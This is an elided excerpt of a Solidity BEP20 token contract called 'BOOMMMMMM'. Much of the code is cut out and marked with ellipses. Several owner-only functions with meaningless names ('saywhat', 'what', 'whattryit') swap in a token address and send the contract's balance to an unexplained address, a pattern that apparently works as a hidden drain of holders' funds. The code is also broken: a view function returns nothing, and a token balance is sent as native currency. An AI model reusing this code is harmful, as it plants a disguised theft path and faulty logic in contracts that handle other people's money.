...
contract DividendDistributor is IDividendDistributor {
    ...
    function CurrentRewards() public view override {
        address(RWDS); 
    }
}

contract BOOMMMMMM is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BOOMMMMMM";
    ...
    function saywhat(address _addr) external authorized {
        BEPP = IBEP20(_addr);
    }

    function what() external payable authorized {
        uint256 amountB = IBEP20(BEPP).balanceOf(address(this));
        payable(SEEE).transfer(amountB);
    }

    function whattryit() external payable authorized {
        uint256 amountBEPP = BEPP.balanceOf(address(this));
        payable(SEEE).transfer(amountBEPP);
    }
